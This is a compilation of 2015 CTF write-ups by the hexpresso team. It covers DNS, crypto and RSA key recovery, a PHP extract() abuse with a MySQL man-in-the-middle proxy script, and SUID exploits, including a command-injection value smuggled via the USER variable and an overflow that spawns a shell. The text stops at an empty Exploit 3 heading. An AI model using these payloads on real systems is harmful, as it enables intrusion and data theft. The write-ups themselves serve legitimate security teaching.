<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-hexpresso
description: CTF writeups and security challenges by hexpresso.
---

# Writeups by hexpresso

Source repository: `/repos/hexpresso`

## Repository Index

- WU-2015/README.md
- WU-2015/hackingweek-2015/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/web/facebox/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/web/facesec/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/reverse/crackme-prime/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/reverse/mass-surveillance-software/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/reverse/superman/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/misc/raptor/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/forensic/pdfception/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/forensic/private/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/exploit/secureauth/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/exploit/updator/README.md
- WU-2015/nuit-du-hack-ctf-quals-2015/crypto/game-of-life/README.md
- WU-2015/hackingweek-2015/reverse/reverse1/README.md
- WU-2015/hackingweek-2015/reverse/reverse2/README.md
- WU-2015/hackingweek-2015/reverse/reverse3/README.md
- WU-2015/hackingweek-2015/reverse/reverse4/README.md
- WU-2015/hackingweek-2015/net/net1/README.md
- WU-2015/hackingweek-2015/net/net2/README.md
- WU-2015/hackingweek-2015/net/net3/README.md
- WU-2015/hackingweek-2015/net/net4/README.md
- WU-2015/hackingweek-2015/forensic/forensic1/README.md
- WU-2015/hackingweek-2015/forensic/forensic2/README.md
- WU-2015/hackingweek-2015/forensic/forensic3/README.md
- WU-2015/hackingweek-2015/forensic/forensic4/README.md
- WU-2015/hackingweek-2015/exploit/exploit1/README.md
- WU-2015/hackingweek-2015/exploit/exploit2/README.md
- WU-2015/hackingweek-2015/exploit/exploit3/README.md
- WU-2015/hackingweek-2015/exploit/exploit4/README.md
- WU-2015/hackingweek-2015/exploit/exploit5/README.md
- WU-2015/hackingweek-2015/exploit/exploit6/README.md
- WU-2015/hackingweek-2015/crypto/crypto1/README.md
- WU-2015/hackingweek-2015/crypto/crypto2/README.md
- WU-2015/hackingweek-2015/crypto/crypto4/README.md
- WU-2015/0ctf-2015/web/forward/README.md
- WU-2015/0ctf-2015/misc/treasure/README.md

## Writeup Content


### File: WU-2015/0ctf-2015/misc/treasure/README.md

# 0CTF 2015 Quals CTF: Treasure

**Category:** Misc
**Points:** 50
**Solves:** 45
**Description:** 

> Romors say that something is buried in treasure.ctf.0ops.sjtu.cn, happy treasure hunting. :)

___

## Write-up

First of all, we do a DNS request :

```bash
$ host -a treasure.ctf.0ops.sjtu.cn
treasure.ctf.0ops.sjtu.cn. 299 IN AAAA 2001:470:d:b28::40:1
treasure.ctf.0ops.sjtu.cn. 299 IN A 127.0.0.1
```
<br>

Well, we see that the IPv4 pointing on localhost, but the IPv6 is more interesting.

Let’s try a ping6 on it:
```bash
$ ping6 2001:470:d:b28::40:1
PING 2001:470:d:b28::40:1(2001:470:d:b28::40:1) 56 data bytes
64 bytes from 2001:470:d:b28::40:1: icmp_seq=1 ttl=14 time=175 ms
```
<br>

Well, it works :)

We decide to traceroute6 on it :
```bash
$ traceroute6 2001:470:d:b28::40:1
1 ...
2 ...
//...//
20 2001:470:d:b28::9:2 (2001:470:d:b28::9:2) 172.610 ms 171.792 ms 172.313 ms
21 2001:470:d:b28::10:2 (2001:470:d:b28::10:2) 171.797 ms 171.699 ms 171.371 ms
22 2001:470:d:b28::11:2 (2001:470:d:b28::11:2) 173.071 ms 171.519 ms 171.780 ms
23 2001:470:d:b28::12:2 (2001:470:d:b28::12:2) 172.427 ms 173.171 ms 171.872 ms
24 2001:470:d:b28::13:2 (2001:470:d:b28::13:2) 172.574 ms 172.949 ms 171.313 ms
25 0000000110001101110000000 (2001:470:d:b28::14:2) 173.872 ms 171.953 ms 171.219 ms
26 0111110111100111110111110 (2001:470:d:b28::15:2) 172.954 ms 172.866 ms 171.901 ms
27 0100010110001100110100010 (2001:470:d:b28::16:2) 172.798 ms 173.038 ms 171.559 ms
28 0100010101000011010100010 (2001:470:d:b28::17:2) 173.087 ms 173.022 ms 173.842 ms
29 0100010101010101110100010 (2001:470:d:b28::18:2) 172.429 ms 174.906 ms 175.403 ms
30 0111110110011011010111110 (2001:470:d:b28::19:2) 174.955 ms 175.574 ms 171.454 ms
```
<br>

Ok, we see some bits.
Our first thought was to translate this into ascii (group by 7 or 8)
But this idea was a big fail :D
We also try XOR, etc.

Notfound said `It’s look like a header of a QRCode, but I think my mind is burning lol.`

But he was right.

Based on this, I had the idea to test with the ipv6 2001:470:d:b28::20:2 :
```bash
$ host 2001:470:d:b28::20:2
2.0.0.0.0.2.0.0.0.0.0.0.0.0.0.0.8.2.b.0.d.0.0.0.0.7.4.0.1.0.0.2.ip6.arpa domain name pointer 0000000101010101010000000.
```
<br>

__BINGO !__

So, I have used a small bash oneliner done by notfound that give us all bits :
```bash
$ for i in {14..38}; do host 2001:470:d:b28::$i:2 | awk '{print $5}'; done
 
0000000110001101110000000.
0111110111100111110111110.
0100010110001100110100010.
0100010101000011010100010.
0100010101010101110100010.
0111110110011011010111110.
0000000101010101010000000.
1111111110111100111111111.
0011100010001010011100111.
0100011011001101101000000.
0101010000111110110010100.
0011111011010110011010101.
1001010100000111010010000.
0001111100000101001010110.
0110110100110010110100000.
0100101001101111101000010.
0110100101100000000001010.
1111111100111011011101001.
0000000101101110010101100.
0111110101111100011100110.
0100010110011010000001101.
0100010111011101000011000.
0100010110010110111010010.
0111110100101111000010110.
0000000100000010010100110.
```
<br>

The last to do was to convert this to an image.<br>
I have used a well-known format, the portable pixmap (.ppm).
```bash
echo "P1" > flag.ppm
echo "25 $((38-14+1))" >> flag.ppm
for i in {14..38}; do host 2001:470:d:b28::$i:2 | gawk '{T=$5 ; sub(/.$/, "", T); print T}' >> flag.ppm; done
convert flag.ppm -negate flag.png
gimp flag.png
```
<br>
![Alt text](https://hexpresso.files.wordpress.com/2015/03/flag_treasure.png)<br>
_flag_treasure_

__Flag__: 0CTF{Reverse DNS is so FUN!}
<br><br>
Enjoy!<br>
[Sorcier](https://twitter.com/_sorcier_) & [Notfound](https://twitter.com/Notfound404__)



### File: WU-2015/0ctf-2015/web/forward/README.md

# 0CTF 2015 Quals CTF: Forward

**Category:** Web
**Points:** 250
**Solves:** 42
**Description:** 

> Just do it!
>
> <http://202.112.28.121/>
>
> <http://202.112.26.104/>

___

## Write-up

This task is a web task worth 250 points from the 0CTF 2015.
There is an input field, and two buttons : Login and FLAG.<br>
FLAG gives us the source code of the task, without the db credentials :

```php
<?php
    if (isset($_GET['view-source'])) {
        show_source(__FILE__);
        exit();
    }
    include("./inc.php"); // key & database config
 
    function err($str){ die("<script>alert(\"$str\");window.location.href='./';</script>"); }
 
    $nonce = mt_rand();
 
    extract($_GET); // this is my backdoor
     
    if (empty($_POST['key'])) {
 
        err("Parameter Missing!");
    }
 
    if ($_POST['key'] !== $key) {
        err("You Are Not Authorized!");
    }
 
    $conn = mysql_connect($host, $user, $pass);
 
    if (!$conn) {
        err("Database Error, Please Contact with GameMaster!");
    }
 
    $query = isset($_POST['query']) ? bin2hex($_POST['query']) : "SELECT flag FROM forward.flag";
    $res = mysql_query($query);
    if (FALSE == $res) {
        err("Database Error, Please Contact with GameMaster!");
    }
 
    $row = mysql_fetch_array($res);
 
    if ($debug) {
        echo "HOST:\t{$host}<br/>";
        echo "USER:\t{$user}<br/>";
    }
 
    echo "<del>FLAG:\t0ctf{</del>" . sha1($nonce . md5($row['flag'])) . "<del>}</del><br/>"; // not real flag
 
    mysql_close($conn);
?>
```
<br><br>
At this point, I was a bit sad, because I wanted to get the flag. :(<br>
After reading the source code, we can guess that we need to get our hands on $row['flag'].

There is also a HUGE hint : `this is my backdoor`.<br>
`extract` extracts variable from an array to the current scope.<br>
Exemple : extract(['foo' => 'bar']); is the same as $foo = 'bar';

We can use it to bypass the first check :
if `$_GET['key']` is set, `$key` will be set to it. (hence the backdoor)

Our first thought is that we can also use it to set nonce to '', so that the page outputs `sha1(md5($flag));`.<br>
This is pointless : we need to reverse a SHA1, then a MD5, and it would take forever.

We can set `$_GET['debug']` to 1, to gather informations about db host, and user :
```
HOST: 202.112.28.121
USER: forward
```
<br><br>
With `nc -vv 202.112.28.121 3306`, we can see the version of MySQL, and that it DOES accept connection from outside.<br>
We have no way to retrieve the password from the script. But we know that the script retrieves the flag.

Interesting thing :
`extract` is called after $host, $user and $pass definitions. It means we can also alter them.

I then made a script to set up a man-in-the-middle attack:<br>
- The web page (client) connects to my computer.<br>
- My computer connects to the MySQL server (server).<br>
- As soon as I read something on one of the sockets, I forward it to the other peer.

Here is the code :
```php
<?php
    $socket = socket_create(2, 1, 0);
    socket_bind($socket, 0, 3306);
    socket_listen($socket);
 
    $client = socket_accept($socket);
 
    $server = socket_create(2, 1, 0);
    socket_connect($server, '202.112.28.121', 3306);
 
    socket_set_nonblock($client);
    socket_set_nonblock($server);
 
    while(true) {
        $packet = socket_read($server, 4096);
        if($packet) {
            printf("S->C: %s\n", $packet);
            socket_write($client, $packet);
        }
 
        $packet = socket_read($client, 4096);
        if($packet) {
            printf("S<-C: %s\n", $packet);
            socket_write($server, $packet);
        }
        usleep(1e4);
    }
?>
```
<br><br>
This way, I managed to get the flag :

`Payload: /admin.php?key=a&debug=1&host=[ip], POST: key=a`
<br><br>
__Flag__: 0ctf{w3ll_d0ne_guY}
<br><br>
Enjoy !
- [XeR]()



### File: WU-2015/README.md

# WU-2015
Writeups for CTF that took place in 2015.



### File: WU-2015/hackingweek-2015/README.md

# HackingWeek CTF write-ups

* [Website](http://hackingweek.fr)
* [Scoreboard](http://hackingweek.fr/ranking/)
* [Number of solves per task](solves.txt)

## Completed write-ups

* [crypto/crypto1](crypto/crypto1)
* [crypto/crypto2](crypto/crypto2)
* [crypto/crypto4](crypto/crypto4)
* [forensic/forensic1](forensic/forensic1)
* [forensic/forensic2](forensic/forensic2)
* [forensic/forensic3](forensic/forensic3)
* [net/net2](net/net2)
* [net/net3](net/net3)
* [net/net4](net/net4)
* [reverse/reverse1](reverse/reverse1)

     
## In-writing write-ups

* [exploit/exploit1](exploit/exploit1)
* [exploit/exploit2](exploit/exploit2)
* [exploit/exploit3](exploit/exploit3)
* [exploit/exploit4](exploit/exploit4)
* [exploit/exploit5](exploit/exploit5)
* [forensic/forensic4](forensic/forensic4)
* [net/net1](net/net1)
* [reverse/reverse2](reverse/reverse2)
* [reverse/reverse3](reverse/reverse3)
* [reverse/reverse4](reverse/reverse4)
 
## Final Scoreboard

![Alt text](http://i.imgur.com/1ZiiUYj.png)



### File: WU-2015/hackingweek-2015/crypto/crypto1/README.md

# HackingWeek CTF 2015: Crypto 1

**Category:** Crypto |
**Points:** 5418 |
**Solves:** 24 |
**Description:** 


> [ADFGVX](http://fr.wikipedia.org/wiki/Chiffre_ADFGVX) était le chiffre utilisé par les Allemands pendant la première guerre mondiale.<br>
> Essayez de vous y frotter en déchiffrant ce message dont le clair est en français:
> 
> ```
> DADVDFDDXDDAXGDFFDXDDDADAXAAGAFGGDAXGADAVAAADVFXFDFDVGFGAAAVFAFGFA
> DADDVDGDVAXVDDVFFADGDGAXGFXXDFXDGGXFAADVGAXDVAVVAVAXDVADXADDDAXGXA
> AVADFVAAFXAGVGAAAFDDGDAGFADFVDAFXDDDDDDADDXXAFFDAGXAVFGFDXFDXD
> ```
> <br>
> _Indice_:<br>
> Le md5sum du mot de passe est <code>a50e38475041f76219748ee22c4377d4</code>.<br>
> Et le _Keysquare_ est: <code>cey1l0zrjshpmof385axib4u92vqwt6gd7nk</code>.<br>

___

## Write-up

This challenge was really fun. I have learn a lot about the ADFGVX encryption.

To solve this challenge, it was necessary to proceed in 2 steps.

* __First step__ : find the plaintext.

```python
#!/usr/bin/env python

from pycipher import ADFGVX
from itertools import permutations


def _possible(a, b):
    for i in range(len(b)):
        for j in range(len(b)):
            if b[i] == b[j]:
                if a[i] != a[j]:
                    return False
            if b[i] != b[j]:
                if a[i] == a[j]:
                    return False
    return True


def _cryptanalyse(cipher):
    if(max(list(cipher), key=lambda x: cipher.count(x)) == cipher[-1:]):
        return cipher
    return False


cipher = """
    DADVDFDDXDDAXGDFFDXDDDADAXAAGAFGGDAXGADAVAAADVFXFDFDVGFGAAAVFAFGFADADDV
    DGDVAXVDDVFFADGDGAXGFXXDFXDGGXFAADVGAXDVAVVAVAXDVADXADDDAXGXAAVADFVAAFXAGV
    GAAAFDDGDAGFADFVDAFXDDDDDDADDXXAFFDAGXAVFGFDXFDXD
    """
crib = "CETTEEPREUVE"

for p in permutations("ABCDEFGHIJ"):
    adfgvx = ADFGVX(key='cey1l0zrjshpmof385axib4u92vqwt6gd7nk',
                    keyword=''.join(p))
    d = adfgvx.decipher(cipher)
    if(_possible(d[len(d)-len(crib):], crib)):
        if(_cryptanalyse(d)):
            print(d + ' <- ' + ''.join(p))
```

So yes, I have guess the end of the plaintext. The word `EPREUVE` was given at a moment, and I guessed that probably be `CETTE EPREUVE`.<br>
That's why I have tried like that. And, fortunately, that was a good choice.

_Output_ : 
```
>>> python adf.py 
TROUVEZLACLEFDECHIFFREMENTDECEMESSAGEETVOUSAUREZLEMOTDEPASSEQUIVOUSPERMETTRADEVALIDERCETTEEPREUVE <- CGBADEFJHI
TR5XVEZC4CLEFDECHIFFREOCNTDCEEMESSAGE02VOUZBUREHCEMOVKEPASSEQUIVOUSR0RMETTRADY2ALIGYRCETTEEPREUVE <- CGBADJFEHI
```

At this point, I was surprised. The plaintext does not give the flag, but tell us to find the key... 
The first thing I did was to try the key I had found. But it failed.
Meanwhile, a hint was added (the `md5sum`).<br>

The second thing I do is to compare my key with the given md5sum.
```
md5(CGBADEFJHI) != a50e38475041f76219748ee22c4377d4
```

Fu. <br><br>

* __Second step__ : Bruteforce the key.

Well, now we have the plaintext and a possible key. 
Knowing the key, we can have the permutation.<br>

`CGBADEFJHI` => `4,3,1,5,6,7,2,9,10,8`<br>

With that, and a little cryptanalysis, it's easy to effectively reduce the bruteforce.
Indeed, if the first letter is a 'D', so the second letter can't be __BEFORE__ 'D', etc.

The permutation is very simple to understand, each letter get an index, and the key is sorted.
For example : 

Key | DABC
---:|:---:
Index | 1234
Permu | `2341`


That's all. Knowing that, it's easy to do a regex which match all the possible keys.<br>
I managed to have this regex :

`D[D-Z][BC][AB][A-Z]{3}`


This regex gave me all possible keys which match the permutation with a `len()` of 7.

Here is my python code :

 ```python
#!/usr/bin/env python

import itertools
import string

for k in itertools.product("bc", repeat=1):
    for l in itertools.product("defghijklmnopqrstuvwxyz", repeat=1):
        for j in itertools.product("ab", repeat=1):
            for i in itertools.product(string.lowercase, repeat=3):
                key = 'd' + ''.join(l) + ''.join(k) + ''.join(j) + ''.join(i)
                if ([i[0] for i in sorted(enumerate(key, 1), key=lambda x: x[1])] == [4, 3, 1, 5, 6, 7, 2]):
                    print(key)
```

I redirected the output into a file [possible_permut.txt](crypto1/possible_permut.txt) to keep them : 

```bash
>>> wc -l possible_permut.txt
37950 possible_permut.txt
```

So now, I just have to bruteforce the 3 last characters. 
With the statement, we passed to `26**10 = 1.4 x 10^14` to `37950 * 26**3 = 6.7 x 10^8`

Here is my final code : 

```python
#!/usr/bin/env python
 
from itertools import product
import hashlib
import string


def _bf_md5(fd):
    for word in fd:
        for i in product(charset, repeat=3):
            key = word.strip() + ''.join(i)
            if hashlib.md5(key).hexdigest() == 'a50e38475041f76219748ee22c4377d4':
                return key

f = open("possible_permut.txt").readlines()
charset = string.lowercase
print("Flag is : %s" % _bf_md5(f))

```

_Output_ :

```
>>> python bf_with_permu.py 
Flag is : docadeitoo
```
<br>
Pwned. <br>
__Flag__ : docadeitoo

Thanks to [XeR](https://twitter.com/XeR_0x2A) for answering my questions.

Enjoy,<br>
\- [Notfound](http://www.notfound.ovh)



### File: WU-2015/hackingweek-2015/crypto/crypto2/README.md

# HackingWeek CTF 2015: Crypto2

**Category:** Crypto |
**Points:** 5848 |
**Solves:** 19 |
**Description:**

> Bob utilise une clef publique RSA avec l'exposant public e = 65537 et le module:<br><br>
> ```
> N = 55089599753625499150129246679078411260946554356961748980861372828434789664694269460953507615455541204658984798121874916511031276020889949113155608279765385693784204971246654484161179832345357692487854383961212865469152326807704510472371156179457167612793412416133943976901478047318514990960333355366785001217
>```
>
> La clef de validation de l'épreuve est donnée par le `md5sum` de la valeur de sa clef privée `d`.
>

___

## Write-up

This challenge was quite simple.
We have to factorize N, and we have to found a good and quickly method.<br>
I have though to fermat, and I have used sage.
<br><br>
_fermat factorization function_ :

```python
sage: def fermatfactor(N):
           if N <= 0: return [N]
           if is_even(N): return [2,N/2]
           a = ceil(sqrt(N))
           while not is_square(a^2-N):
                 a = a + 1
           b = sqrt(a^2-N)
           return [a - b,a + b]
....:
```
<br>

_N_ :

```python
sage: N = 5508959975362549915012924667907841126094655435696174898086137282843
79765385693784204971246654484161179832345357692487854383961212865469152326807
1217
```
<br>

_print the result_ :
```python
sage: print fermatfactor(N)
[7422236843002619998657542152935407597465626963556444983366482781089760759017
26605114751241363894917330639701180033134442415868230443995865298299493927642
7, 74222368430026199986575421529354075974656269635564449833664827810897607609
14403641211700959458736191688739694068306773186013683526913015038631710959988
771]
```
<br>
At this point, I had `p * q`, which is `N`.<br>
`N = p * q`

With `p, q and e`, I can found `d`.

```bash
$ p=7422236843002619998657542152935407597465626963556444983366482781089760759017266051147512413638949173306397011800331344424158682304439958652982994939276427
$ q=7422236843002619998657542152935407597465626963556444983366482781089760760914403641211700959458736191688739694068306773186013683526913015038631710959988771
$ e=65537
$ python rsa.py -p$p -q$q -e$e --search d

d = 23064887432133452418944968485393480424632078139076757103405026306352475603240094293896627789805523522813645480807271096237944782073289886838211647399003341787604426963520708394682398410522699177647706339791627975491188337143684005336934914780236824919338821455517142365700147254540590602906990901658514178413
```
<br>
Pwned.

__Flag__: `<the value of d>`

Enjoy.<br>
\- [Notfound](http://www.notfound.ovh)



### File: WU-2015/hackingweek-2015/crypto/crypto4/README.md

# HackingWeek CTF 2015: Crypto4

**Category:** Crypto |
**Points:** 6536 |
**Solves:** 11 |
**Description:**

> ```
> Session Start: Thu Feb 05 20:49:04 2015
> Session Ident: #mastercsi
> 03[20:49] * Now talking in #mastercsi
> 03[20:49] * Topic is 'http://mastercsi.labri.fr/'
> 03[20:49] * Set by admin!~admin on Sat Nov 22 00:06:50
> 01[20:49]  et j'ai chopé une vieille clé rsa qu'alice utilisait
> 01[20:49]  alice, la alice? tu te fous de moi ?
> 01[20:49]  haha non
> 01[20:49]  mais y'avait juste la moitié, j'ai dû la compléter
>            avec des valeurs au pif pour la faire marcher
> 01[20:49]  ça a l'air de fonctionner quand même en tout cas,
>            si ta un truc à elle à déchiffrer...
> 01[20:49]  attend j'ai sa clé publique qui traîne quelque part,
>            et même un fichier chiffré avec. me suis toujours
>            demandé ce que c'était... 
> 01[20:49]  peut-être que c'est la même clé ?
> 01[20:50]  je t'ai envoyé le truc, jette un coup d'oeil
> 02[21:22] * Disconnected
> Session Close: Thu Feb 05 21:22:11 2015
> ```
>
> La clef de validation est le contenu du message chiffré avec la clef privée d'Alice, reconstituez le en utilisant les fichiers suivants:
> 
> * [`alice.pub`](http://hackingweek.fr/media/Aa0eiHuu/alice.pub)
> * [`mykey.pem`](http://hackingweek.fr/media/Aa0eiHuu/mykey.pem)
> * [`secret`](http://hackingweek.fr/media/Aa0eiHuu/secret)

___

## Write-up

For this task, we were given 3 files.

- _Alice's public key_ :

```
>>> openssl rsa -pubin -in alice.pub -text -noout -modulus
Public-Key: (1024 bit)
Modulus:
    00:c6:c8:35:29:a2:38:8f:14:63:65:c5:f5:fd:4b:
    0d:88:89:61:b9:5d:e1:0f:fa:88:53:a3:c2:cb:ed:
    75:0e:99:59:bd:0f:f8:72:c2:23:2f:6b:ad:32:62:
    4f:35:6a:82:d0:62:75:5e:1e:4f:ed:ae:54:e8:ca:
    24:71:fc:8d:13:ac:70:0e:e2:57:20:d4:d9:08:9f:
    d6:fb:d4:2f:12:e6:a4:1e:1c:1d:e8:1f:57:8c:32:
    13:2a:d0:85:94:e8:51:84:1d:02:39:cd:41:0d:ef:
    11:d1:c1:5e:e7:5b:92:f8:6a:04:f7:c6:c7:f3:6b:
    90:46:b8:fb:2f:e2:95:65:b1
Exponent: 65537 (0x10001)
Modulus=C6C83529A2388F146365C5F5FD4B0D888961B95DE10FFA8853A3C2CBED750E9959BD0FF872C2232F6BAD32624F356A82D062755E1E4FEDAE54E8CA2471FC8D13AC700EE25720D4D9089FD6FBD42F12E6A41E1C1DE81F578C32132AD08594E851841D0239CD410DEF11D1C15EE75B92F86A04F7C6C7F36B9046B8FB2FE29565B1
```
<br>
So we have the exponent `e` and the modulus `N`.

- _mykey.pem_ :

```
>>> openssl rsa -in mykey.pem -text -noout -modulus
Private-Key: (1024 bit)
modulus:
    00:c6:c8:35:29:a2:38:8f:14:63:65:c5:f5:fd:4b:
    0d:88:89:61:b9:5d:e1:0f:fa:88:53:a3:c2:cb:ed:
    75:0e:99:59:bd:0f:f8:72:c2:23:2f:6b:ad:32:62:
    4f:35:6a:82:d0:62:75:5e:1e:4f:ed:ae:54:e8:ca:
    24:71:fc:8d:13:ac:70:0e:e2:57:20:d4:d9:08:9f:
    d6:fb:d4:2f:12:e6:a4:1e:1c:1d:e8:1f:57:8c:32:
    13:2a:d0:85:94:e8:51:84:1d:02:39:cd:41:0d:ef:
    11:d1:c1:5e:e7:5b:92:f8:6a:04:f7:c6:c7:f3:6b:
    90:46:b8:fb:2f:e2:95:65:b1
publicExponent: 3 (0x3)
privateExponent:
    00:84:85:78:c6:6c:25:b4:b8:42:43:d9:4e:a8:dc:
    b3:b0:5b:96:7b:93:eb:5f:fc:5a:e2:6d:2c:87:f3:
    a3:5f:10:e6:7e:0a:a5:a1:d6:c2:1f:9d:1e:21:96:
    df:78:f1:ac:8a:ec:4e:3e:be:df:f3:c9:8d:f0:86:
    c2:f6:a8:5e:0b:ef:c0:ca:19:c5:e2:49:55:49:fe:
    e5:2e:51:3e:7b:e9:f2:22:07:d2:4b:84:7f:bb:0c:
    b5:ba:b7:95:c6:90:05:3e:65:2d:11:53:9a:2d:96:
    0f:ea:de:cb:9b:17:54:87:00:0f:78:12:ce:ac:f5:
    db:83:30:16:06:cc:35:7d:a3
prime1: 245 (0xf5)
prime2: 207 (0xcf)
exponent1: 163 (0xa3)
exponent2: 138 (0x8a)
coefficient: 189 (0xbd)
Modulus=C6C83529A2388F146365C5F5FD4B0D888961B95DE10FFA8853A3C2CBED750E9959BD0FF872C2232F6BAD32624F356A82D062755E1E4FEDAE54E8CA2471FC8D13AC700EE25720D4D9089FD6FBD42F12E6A41E1C1DE81F578C32132AD08594E851841D0239CD410DEF11D1C15EE75B92F86A04F7C6C7F36B9046B8FB2FE29565B1
```
<br>
Here, the most important thing is that the privateExponent `d` is given.

```
>>> 0x00848578c66c25b4b84243d94ea8dcb3b05b967b93eb5ffc5ae26d2c87f3a35f10e67e0aa5a1d6c21f9d1e2196df78f1ac8aec4e3ebedff3c98df086c2f6a85e0befc0ca19c5e2495549fee52e513e7be9f22207d24b847fbb0cb5bab795c690053e652d11539a2d960feadecb9b175487000f7812ceacf5db83301606cc357da3

93059673632372950846760233404528265552269035223116912529822641707683942804264477357459595582862911535897995187130227884549537965505362023024775114219145218863449310278405967527628414837264004662699074903716560546461614167980089864300514695266151435327524971233343815264097726955869839543417933242229553724835
```
<br>
So now, we have `N`, `d` and `e` and can reconstruct the private key : 

```bash
>>> rsatool.py -n 139589510448559426270140350106792398328403552834675368794733962561525914206396716036189393374294367303846992780695341826824306948258043034537162671328717852010658546072889560963675752283945322326005793726927254786393742142055806404861768824642002369852610966461772991591954263592365958281593575065087653537201 -e 3 -d 93059673632372950846760233404528265552269035223116912529822641707683942804264477357459595582862911535897995187130227884549537965505362023024775114219145218863449310278405967527628414837264004662699074903716560546461614167980089864300514695266151435327524971233343815264097726955869839543417933242229553724835

Using (n, d) to initialise RSA instance

n =
c6c83529a2388f146365c5f5fd4b0d888961b95de10ffa8853a3c2cbed750e9959bd0ff872c2232f
6bad32624f356a82d062755e1e4fedae54e8ca2471fc8d13ac700ee25720d4d9089fd6fbd42f12e6
a41e1c1de81f578c32132ad08594e851841d0239cd410def11d1c15ee75b92f86a04f7c6c7f36b90
46b8fb2fe29565b1

e = 3 (0x3)

d =
848578c66c25b4b84243d94ea8dcb3b05b967b93eb5ffc5ae26d2c87f3a35f10e67e0aa5a1d6c21f
9d1e2196df78f1ac8aec4e3ebedff3c98df086c2f6a85e0befc0ca19c5e2495549fee52e513e7be9
f22207d24b847fbb0cb5bab795c690053e652d11539a2d960feadecb9b175487000f7812ceacf5db
83301606cc357da3

p =
cf274700d6f6adea7e5344a45c34a92fb93db8f23f5da7de32decc6fe46b7d6dc43aabf15bb1cc0f
4865112a3d17166682e43cbc2a81e2ed64a75e55c6398a7b

q =
f5a798bad756b8ee9b4e3a91fe1cafd7ffad5770377af0156c23c64d407f92dbe24a92ae7427fd7e
b18c620341a17dc7670986ee676e17d99d497bcfea0b9ec3

```

To finish, we just need to reconstruct the real private key using `p` and `q`.

```bash
>>> rsatool.py -p 10849505326481756291467078773071822372991137432974866960395851121614351820034216452685397471770720115956086308531118673792947647173561074086963379535710843 -q 12865979254173524318205154356956226942340819748396485453570850199275733851574194544096345303446141207553525448737577133880210914025405392588238363787239107 -e 65537 -o real.pem

>>> openssl rsautl -decrypt -in secret -out plaintext -inkey real.pem
>>> cat plaintext 
kenny
```

<br>
Pwned.

__Flag__: kenny

Enjoy,<br>
\- [Notfound](http://www.notfound.ovh)




### File: WU-2015/hackingweek-2015/exploit/exploit1/README.md

# HackingWeek CTF 2015: Exploit 1

**Category:** exploit |
**Points:** 860 |
**Solves:** 77 |
**Description:**

> Connectez-vous en tant que <code>guest</code> (mot de passe: <code>shu1eKoo</code>) sur la machine <code>37.187.22.21</code>.<br>
> Vous trouverez la clef de validation cachée dans le fichier <code>/home/exploit01/.secret</code>.
>
> ```
> $> ssh guest@37.187.22.21
> ```

___

## Write-up

This task is an exploit task.  
We are given a shell on a remote server.  
The source code is also given :

```C
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int
main()
{
  char *buffer = NULL;
  gid_t gid = getegid();
  uid_t uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  asprintf(&buffer, "/bin/echo %s is using this program!", getenv("USER"));
  system(buffer);

  return EXIT_SUCCESS;
}
```		

The goal is pretty obvious : for every exploiting task, we need to take
advantage of an SUID binary, and read the content of
/home/exploit<nb>/.secret.  
This task is the first one, and is pretty easy : there is an unchecked call to
system() with an environment variable.  
It is possible for a user to change the USER variable either by exporting it,
or prepending `USER='foo'` before runing the binary.  
It makes it possible to run commands easilly :  
> `USER=';whoami; cat ../.secret #' ./vulnerable`  
> 
> exploit01  
> raht6ae1Ue

**Flag**: raht6ae1Ue



### File: WU-2015/hackingweek-2015/exploit/exploit2/README.md

# HackingWeek CTF 2015: Exploit 2

**Category:** exploit |
**Points:** 3870 |
**Solves:** 42 | 
**Description:**

> Connectez-vous en tant que <code>guest</code> (mot de passe: <code>shu1eKoo</code>) sur la machine <code>37.187.22.21</code>.<br>
> Vous trouverez la clef de validation cachée dans le fichier <code>/home/exploit02/.secret</code>.
>
> ```
> $> ssh guest@37.187.22.21
> ```

___

## Write-up

This task is an exploit task.  
We are given a shell on a remote server.  
The source code is also given :

```C
#include <stdio.h>
#include <stdlib.h>

int
main (int argc, char **argv)
{
  if (argc < 3)
    {
      fprintf (stderr, "error: missing argument ! Usage: ./vulnerable 10 AAA\n");
      exit (EXIT_FAILURE);
    }

  int size = atoi(argv[1]);
  float fsize = ((float) size) / 100;
  if (size > 1024)
    {
      fprintf (stderr, "error: cannot go more than 1024 !\n");
      exit (EXIT_FAILURE);
    }
  else if (size < 0)
    {
      fprintf (stderr, "error: cannot be a negative number !\n");
      exit (EXIT_FAILURE);
    }

  float x;
  int i = 0;
  char buffer[1024];

  for (x = 0; x < fsize; x + 0.01)
    buffer[i++] = argv[2][0];

  for (i = 0; i < size; i++)
    printf(" %c", buffer[i]);
  fputs("\n", stdout);

  if (x > 80000000000000000000000000000000000000.0)
    system ("/bin/sh");

  return EXIT_SUCCESS;
}
```		

This one is a bit trickier, because it is rather a mistake than an actual
vulnerability. You may not have noticed, but the first for loop has `x + 0.01`
instead of `x += 0.01`.  
At first sight, we thought it was a compiler feature, but it was not :  
The program puts `argv[1][0]` in buffer for ever... until it overwrites other
variables.  
What happens here is that we will overwrite variables.  
In the memory, stack, which contains every local variables, looks like this :
```
+--------+---+-------+------+---+----+----+
| buffer | x | fsize | size | i | bp | ip |
+--------+---+-------+------+---+----+----+
```
(You can figure this out by using a disassembler)

We can see that the loop will write buffer, then x, then fsize.  
When you overwrite fsize, the loop will end, since the condition will be
fullfilled.  
All we need is the hexadecimal representation of a float over 8000... that can
be written with the same char 4 times.  
There are different ways to find it. We did it by trying common values
(eg: 0xFF, 0x80, 0x7F)  
`./vulnerable 1 $'\x7f'`
>  
>  
> sh-4.2$ `whoami; cat ../.secret`  
> exploit02  
> cai0Aexee3

**Flag**: cai0Aexee3



### File: WU-2015/hackingweek-2015/exploit/exploit3/README.md

# HackingWeek CTF 2015: Exploit 3

**Category:** exploit |
**Points:** 3526 |
**Solves:** 46 | 
**Description:**

